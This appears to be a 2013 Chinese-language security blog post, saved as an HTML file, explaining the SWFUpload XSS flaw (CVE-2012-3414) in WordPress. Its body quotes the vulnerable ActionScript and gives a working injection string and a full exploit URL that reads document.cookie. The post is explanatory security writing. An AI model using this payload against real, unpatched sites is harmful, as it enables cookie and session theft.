@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- Google Tag Manager -->
+    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-M3BFP5');</script>
+    <!-- End Google Tag Manager -->
+
+    <link href="/templates/static/css/files?default.less&other.less&ezHTML.less&?v=20180416-2" rel="stylesheet" type="text/css">
+    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.3.1/jquery.min.js?v=20180416-2"></script>
+    <script src="/templates/static/js/files?lightHttp-simple-min.js&default.js&facebookAPI.js&form_check.js&util.js&listAutoLoadMore.js&?v=20180416-2"></script>
+
+
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="content-language" content="zh-TW" />
+    <meta name="author" content="Puritys" />
+    <title>XSS Attack of Wordpress in SWFUpload</title>
+    <meta name="keywords" content="" />
+    <meta name="description" content="Wordpress 中的 TinyMCE 編輯器，他的檔案上傳工具是使用 swfupload ，swfupload 主要是為了提供 flash 多檔案上傳功能，在 HTML5 File API 還未開發出來時，我們都是使用 Flash 來達成網頁可以同時選取多個檔案，以及同時上傳。swfupload 2.2.0 以前的版本，已經被發現一個 XSS 的漏洞。先來看一段 swfup" />
+    <meta property="fb:app_id" content="160015347378316" />
+    <meta property="fb:admins" content="1140660203"/>
+    
+
+    <link rel="shortcut icon" href="/templates/static/images/favicon_puritys.ico" /> 
+    
+
+    <link rel="canonical" href="https://www.puritys.me/docs-blog/article-184-XSS-Attack-of-Wordpress-in-SWFUpload.html"/>
+    
+
+    <link rel="alternate" hreflang="zh-CN" href="https://www.puritys.me/zh_cn/docs-blog/article-184-XSS-Attack-of-Wordpress-in-SWFUpload.html">
+        <link rel="alternate" hreflang="zh-TW" href="https://www.puritys.me/docs-blog/article-184-XSS-Attack-of-Wordpress-in-SWFUpload.html">
+        
+
+
+    <link rel="amphtml" href="https://www.puritys.me/docs-blog-amp/article-184-XSS-Attack-of-Wordpress-in-SWFUpload.html"/>
+    
+
+    <link rel="dns-prefetch" href="apis.google.com">
+        <link rel="dns-prefetch" href="ajax.googleapis.com">
+        <link rel="dns-prefetch" href="connect.facebook.net">
+        <link rel="dns-prefetch" href="www.google-analytics.com">
+        <link rel="dns-prefetch" href="www.puritys.me">
+        
+
+<!--[if lt IE 9]>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <![endif]-->
+    
+<script type="application/ld+json">
+{
+   "@context": "http://schema.org",
+   "@type": "WebSite",
+   "url": "//www.puritys.me",
+   "potentialAction": {
+     "@type": "SearchAction",
+     "target": "https://www.puritys.me/search?searchText={search_term_string}",
+     "query-input": "required name=search_term_string"
+   }
+}
+    </script>
+    
+
+
+<script type="application/ld+json">
+{ "@context" : "http://schema.org",
+  "@type" : "Organization",
+  "name" : "",
+  "url" : "//www.puritys.me",
+  "sameAs" : [ 
+    
+    "https://github.com/puritys",
+    
+    "https://www.facebook.com/Puritys.Chen.5815"
+    
+  ] 
+}
+    </script>
+
+
+
+
+
+
+
+</head>
+<body>
+
+            
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-M3BFP5"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+
+            
+<div class="settings">
+    
+        <script>var WRT="https://www.puritys.me/";</script>
+    
+</div>
+
+
+            
+<div class="header">
+    <div class="top-header">
+        <div class="main">
+        <a class="logo" href="/"><img src="/templates/static/images/logo_puritys.png" alt="Puritys Blog" title="Puritys Blog"></a>
+        <a class="navbar-btn" href="#"><span class="icon"></span></a>
+        </div>
+        <ul class="navbar">
+             
+            <li >
+                <a href="/news" data-ga='{"action":"menu_click","label":"\u7db2\u8def\u65b0\u805e"}'>網路新聞</a>
+            </li>
+             
+            <li >
+                <a href="/life" data-ga='{"action":"menu_click","label":"\u751f\u6d3b\u65c5\u904a"}'>生活旅遊</a>
+            </li>
+             
+            <li class="active">
+                <a href="/WEB_SECURITY" data-ga='{"action":"menu_click","label":"\u7db2\u8def\u5b89\u5168"}'>網路安全</a>
+            </li>
+             
+            <li >
+                <a href="/docs-cate" data-ga='{"action":"menu_click","label":"\u7a0b\u5f0f\u96dc\u8a18"}'>程式雜記</a>
+            </li>
+            
+        </ul>
+        <form action="/search" class="navbar-form">
+            <input type="text" name="searchText" placeholder="Input your keyword" value="">
+            <i class="glyphicon glyphicon-search"></i>
+        </form>
+    </div>
+</div>
+
+
+        
+
+        
+<div class="body-content">
+    
+            
+    <div class="main">
+        
+                
+<ul class="breadcrumb" itemscope itemtype="http://schema.org/BreadcrumbList"> 
+    <li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
+        <a href="//www.puritys.me" itemscope itemtype="http://schema.org/Thing" itemprop="item">
+            <em><span itemprop="name">Home</span></em>
+        </a>
+        <meta itemprop="position" content="1" />
+    </li>
+    
+        
+            <li  itemprop="itemListElement" itemscope  itemtype="http://schema.org/ListItem">
+                <a href="/WEB_SECURITY" itemscope itemtype="http://schema.org/Thing" itemprop="item">
+                    <em><span itemprop="name">網路安全</span></em>
+                </a>
+                <meta itemprop="position" content="2" />
+            </li>
+        
+    
+        
+            <li class="active">
+                <a href="//www.puritys.me/docs-blog/article-184">
+                    <em><span>XSS Attack of Wordpr...</span></em>
+                </a>
+            </li>
+        
+    
+</ul>
+
+        
+                
+
+
+<script type="application/ld+json">
+    {"@context":"http:\/\/schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/www.puritys.me\/docs-blog\/article-184-XSS-Attack-of-Wordpress-in-SWFUpload.html"},"headline":"XSS Attack of Wordpress in SWFUpload","image":"","datePublished":"2013-07-28T23:02:31+08:00","dateModified":"2013-07-29T00:13:04+08:00","author":{"@type":"Person","name":"puritys"},"publisher":{"@type":"Organization","name":"www.puritys.me","logo":{"@type":"ImageObject","url":"https:\/\/www.puritys.me\/templates\/static\/images\/favicon_puritys.ico"}},"description":"\r\rWordpress \u4e2d\u7684 TinyMCE \u7de8\u8f2f\u5668\uff0c\u4ed6\u7684\u6a94\u6848\u4e0a\u50b3\u5de5\u5177\u662f\u4f7f\u7528 swfupload \uff0cswfupload \u4e3b\u8981\u662f\u70ba\u4e86\u63d0\u4f9b flash \u591a\u6a94\u6848\u4e0a\u50b3\u529f\u80fd\uff0c\u5728 HTML5 File API \u9084"}
+</script>
+
+
+<div class="entry">
+   <div class="entry-header">
+        
+        <div class="date">
+            <div class="year">2013</div>
+            <div class="month">Jul</div>
+            <div class="day">28</div>
+        </div>
+
+        
+        <div class="title">
+            <h1><a href="/docs-blog/article-184-XSS-Attack-of-Wordpress-in-SWFUpload.html"><span>XSS Attack of Wordpress in SWFUpload</span></a></h1>
+            <div class="sub">
+                <div class="caption">Tags:</div>
+                <ul class="labels">
+                    
+                </ul>
+            </div>
+            
+            <div class="lang-wrap">
+            
+                <a href="https://www.puritys.me/zh_cn/docs-blog/article-184-XSS-Attack-of-Wordpress-in-SWFUpload.html" rel="alternate" hreflang="zh-CN">簡中版</a>
+            
+            </div>
+            
+        </div>
+    </div>
+
+    
+    <div class="entry-body">
+        <div class="ezHTML-content"><a name="top"></a><p class="vj-quote" >Wordpress 中的 TinyMCE 編輯器，他的檔案上傳工具是使用 <a href="https://code.google.com/p/swfupload/" target="_blank">swfupload</a> ，swfupload 主要是為了提供 flash 多檔案上傳功能，在 HTML5 File API 還未開發出來時，我們都是使用 Flash 來達成網頁可以同時選取多個檔案，以及同時上傳。</p><p class="vj-quote" >swfupload 2.2.0 以前的版本，已經被發現一個 XSS 的漏洞。</p><p class="vj-quote" >先來看一段 swfupload ActionScript 3.0 的程式</p> <br /><ul class="vj-ul"><li class="vj-lv2"> <a href=" https://code.google.com/p/swfupload/source/browse/swfupload/trunk/core/Flash/SWFUpload.as?spec=svn916&r=852"  target="_blank"> https://code.google.com/p/swfupload/source/browse/swfupload/trunk/core/Flash/SWFUpload.as?spec=svn916&r=852</a></li></ul><div class="codeBlock"><span class="title"> SWFUpload.as </span><pre class="prettyprint lang-my_js linenums" ><ol class="linenums"><li class="L0"><span class="kwd">this</span><span class="pun">.</span><span class="pln">movieName </span><span class="pun">=</span><span class="pln"> root</span><span class="pun">.</span><span class="pln">loaderInfo</span><span class="pun">.</span><span class="pln">parameters</span><span class="pun">.</span><span class="pln">movieName</span><span class="pun">;</span></li><li class="L1"><span class="kwd">this</span><span class="pun">.</span><span class="pln">flashReady_Callback   </span><span class="pun">=</span><span class="pln"> </span><span class="str">"SWFUpload.instances[&#92;""</span><span class="pln"> </span><span class="pun">+</span><span class="pln"> </span><span class="kwd">this</span><span class="pun">.</span><span class="pln">movieName </span><span class="pun">+</span><span class="pln"> </span><span class="str">"&#92;"].flashReady"</span><span class="pun">;</span></li><li class="L2"><span class="pln">&nbsp;</span></li><li class="L3"><span class="kwd">if</span><span class="pln"> </span><span class="pun">(</span><span class="typ">ExternalCall</span><span class="pun">.</span><span class="typ">Bool</span><span class="pun">(</span><span class="kwd">this</span><span class="pun">.</span><span class="pln">testExternalInterface_Callback</span><span class="pun">))</span><span class="pln"> </span><span class="pun">{</span></li><li class="L4"><span class="pln">       </span><span class="typ">ExternalCall</span><span class="pun">.</span><span class="typ">Simple</span><span class="pun">(</span><span class="kwd">this</span><span class="pun">.</span><span class="pln">flashReady_Callback</span><span class="pun">);</span></li><li class="L5"><span class="pln">       </span><span class="kwd">this</span><span class="pun">.</span><span class="pln">hasCalledFlashReady </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">true</span><span class="pun">;</span></li><li class="L6"><span class="pun">}</span></li></ol></pre></div><p class="vj-quote" >前兩行有一個很大的問題， input value 沒有經過任何檢查，這樣駭客可以對 movieName 植入任意值，而 4 ，5 又會直接執行 Simple 這個 function。</p><p class="vj-quote" >Simple 的程式碼可以看這一段</p><ul class="vj-ul"><li class="vj-lv2"> <a href=" https://code.google.com/p/swfupload/source/browse/swfupload/trunk/core/Flash/ExternalCall.as?r=852"  target="_blank"> https://code.google.com/p/swfupload/source/browse/swfupload/trunk/core/Flash/ExternalCall.as?r=852</a></li></ul><div class="codeBlock"><span class="title"> ExternalCall.as </span><pre class="prettyprint lang-my_js linenums" ><ol class="linenums"><li class="L0"><span class="pln"> </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">static</span><span class="pln"> </span><span class="kwd">function</span><span class="pln"> </span><span class="typ">Simple</span><span class="pun">(</span><span class="pln">callback</span><span class="pun">:</span><span class="typ">String</span><span class="pun">):</span><span class="kwd">void</span><span class="pln"> </span><span class="pun">{</span></li><li class="L1"><span class="pln">        </span><span class="typ">ExternalInterface</span><span class="pun">.</span><span class="pln">call</span><span class="pun">(</span><span class="pln">callback</span><span class="pun">);</span></li><li class="L2"><span class="pln"> </span><span class="pun">}</span></li></ol></pre></div><p class="vj-quote" >這裡直接執行了 callback ，也就上一段的 flashReady_Callback ， flash 會將 SWFUpload.instancesxxx 這一段文字當成一個字串，並且先 parse 後，交給  Javascript 去執行。</p><p class="vj-quote" >因為最後是交由 Javascript 去執行這一段 code ，所以我們就輸入以下的 hack 字串。 </p><div class="codeBlock"><span class="title"> XSS injection</span><pre class="prettyprint lang-my_js linenums" ><ol class="linenums"><li class="L0"><span class="str">"]); } catch (e) {};  if ( typeof(xss) == "</span><span class="kwd">undefined</span><span class="str">" ) { alert(document.cookie); } var xss=1; //</span></li></ol></pre></div><p class="vj-quote" >最後的結果，Javascript 會去執行這段有問題的程式。</p><div class="codeBlock"><span class="title"> XSS injection</span><pre class="prettyprint lang-my_js linenums" ><ol class="linenums"><li class="L0"><span class="kwd">try</span><span class="pln"> </span><span class="pun">{</span></li><li class="L1"><span class="pln">   </span><span class="kwd">return</span><span class="pln"> encodeURIComponent</span><span class="pun">(</span><span class="pln"> </span><span class="typ">SWFUpload</span><span class="pun">.</span><span class="pln">instances</span><span class="pun">[</span><span class="str">""</span><span class="pun">]</span><span class="pln"> </span><span class="pun">);</span><span class="pln"> </span></li><li class="L2"><span class="pun">}</span><span class="pln"> </span><span class="kwd">catch</span><span class="pln"> </span><span class="pun">(</span><span class="pln">e</span><span class="pun">)</span><span class="pln"> </span><span class="pun">{};</span><span class="pln">  </span></li><li class="L3"><span class="kwd">if</span><span class="pln"> </span><span class="pun">(</span><span class="pln"> </span><span class="kwd">typeof</span><span class="pun">(</span><span class="pln">xss</span><span class="pun">)</span><span class="pln"> </span><span class="pun">==</span><span class="pln"> </span><span class="str">"undefined"</span><span class="pln"> </span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span><span class="pln"> alert</span><span class="pun">(</span><span class="pln">document</span><span class="pun">.</span><span class="pln">cookie</span><span class="pun">);</span><span class="pln"> </span><span class="pun">}</span><span class="pln"> </span></li><li class="L4"><span class="kwd">var</span><span class="pln"> xss</span><span class="pun">=</span><span class="lit">1</span><span class="pun">;</span><span class="pln"> </span></li><li class="L5"><span class="com">// "].flashReady();</span></li></ol></pre></div><br /><br /><p class="vj-quote" >XSS  URL sample : </p><p class="vj-quote" >http://xxx.hackwordpress/wp-includes/js/swfupload/swfupload.swf?movieName="]); } catch (e) {};  if ( typeof(xss) == "undefined" ) { alert(document.cookie); } var xss=1; //</p><a name="vj-t0"></a><h2 class="vj-sub-title"> 相關資料 </h2><a href="#top" class="vj-btn_top2"></a><ul class="vj-ul"><li class="vj-lv2"> <a href=" http://www.cvedetails.com/cve/CVE-2012-3414"  target="_blank"> http://www.cvedetails.com/cve/CVE-2012-3414</a></li><li class="vj-lv2"> <a href=" https://code.google.com/p/swfupload/"  target="_blank"> https://code.google.com/p/swfupload/</a></li></ul></div>
+    </div>
+    <div class="entry-footer">
+        <p class="article-modify-author">This post was last modified by
+            <span>puritys</span>
+            <time datetime="2013-07-29T00:13:04+08:00" class="article-modify-time">2013/07/29</time>
+        </p>
+
+        
+    <ul class="share-btn-wrap">
+        <li><a href="https://www.facebook.com/sharer/sharer.php?u=https://www.puritys.me/docs-blog/article-184" class="shareBtn" title="share" rel="nofollow"></a></li>
+        <li>
+            <iframe src="https://www.facebook.com/plugins/like.php?href=https://www.puritys.me/docs-blog/article-184" scrolling="no" frameborder="0"
+                style="border:none; width:450px; height:80px"></iframe>
+        </li>
+    </ul>
+
+
+
+        
+    </div>
+    
+    
+        <br />
+        <ins class="adsbygoogle"
+     style="display:inline-block;width:728px;height:90px"
+     data-ad-client="ca-pub-1449650742587459"
+     data-ad-slot="2197220184"></ins>
+
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-1449650742587459",
+          enable_page_level_ads: true
+     });
+</script>
+    
+
+</div>
+
+        
+            
+    </div>
+    
+
+            
+    <div class="sidebar">
+        
+                
+
+<div class="list-group">                                                                                                                            
+    <h4 class="list-group-heading">類別 網路安全</h4>
+    <ul>
+    
+        <li><a href="/docs-blog/article-376-HTTP-:-SSLv3-漏洞---Poodle-攻擊.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_376&quot;}'>HTTP : SSLv3  漏洞  - Poodle 攻擊 </a></li>
+    
+        <li><a href="/docs-blog/article-367-IceCTF-2016-challenges.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_367&quot;}'>IceCTF 2016  challenges </a></li>
+    
+        <li><a href="/docs-blog/article-346-SYN-flood-attack-：封包-DOS-攻擊.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_346&quot;}'>SYN flood attack ：封包 DOS 攻擊 </a></li>
+    
+        <li><a href="/docs-blog/article-276-網路安全相關-Blog.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_276&quot;}'>網路安全相關 Blog </a></li>
+    
+        <li><a href="/docs-blog/article-251-OpenSSL-CVE-2014-0160-Heartbleed-漏洞.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_251&quot;}'>OpenSSL CVE-2014-0160 Heartbleed  漏洞 </a></li>
+    
+        <li><a href="/docs-blog/article-249-Chrome-Extension-MultiLogin-駭客盜帳號?.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_249&quot;}'>Chrome Extension MultiLogin 駭客盜帳號? </a></li>
+    
+        <li><a href="/docs-blog/article-236-DNS-HIJACKING-說明與防護.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_236&quot;}'>DNS HIJACKING  說明與防護 </a></li>
+    
+        <li><a href="/docs-blog/article-226-六種常見的駭客攻擊方式.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_226&quot;}'>六種常見的駭客攻擊方式 </a></li>
+    
+        <li><a href="/docs-blog/article-212-網站路徑駭客攻擊.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_212&quot;}'>網站路徑駭客攻擊 </a></li>
+    
+        <li><a href="/docs-blog/article-205-Google-Spider-Hacked-My-Website.html" data-ga='{&quot;action&quot;:&quot;list_click&quot;,&quot;label&quot;:&quot;id_205&quot;}'>Google Spider Hacked My Website </a></li>
+    
+    </ul>
+</div>
+
+
+        
+                
+
+
+        
+            
+    </div>
+    
+        
+</div>
+
+
+
+    
+
+            
+<div class="bottom-footer">
+    <ul class="nav">
+        
+        <li >
+            <a href="/news">網路新聞</a>
+        </li>
+        
+        <li >
+            <a href="/life">生活旅遊</a>
+        </li>
+        
+        <li class="active">
+            <a href="/WEB_SECURITY">網路安全</a>
+        </li>
+        
+        <li >
+            <a href="/docs-cate">程式雜記</a>
+        </li>
+        
+
+        <li>
+            <a href="https://www.puritys.me/">puritys.me</a>
+        </li>
+        <li>
+            <a href="http://www.lingihuang.com/">VIVIAN CRAP</a>
+        </li>
+        
+    </ul>
+    <p>Copyright &amp;copy; 2014 PURITYS.COM. All rights reserved.</p>
+</div>
+
+
+            
+<script src="https://connect.facebook.net/en_US/all.js"></script>
+
+
+        
+</body>
+    <script src="/templates/static/js/files?sidebar.js&ezHTML_main.js&?v=20180416-2"></script>
+</html>
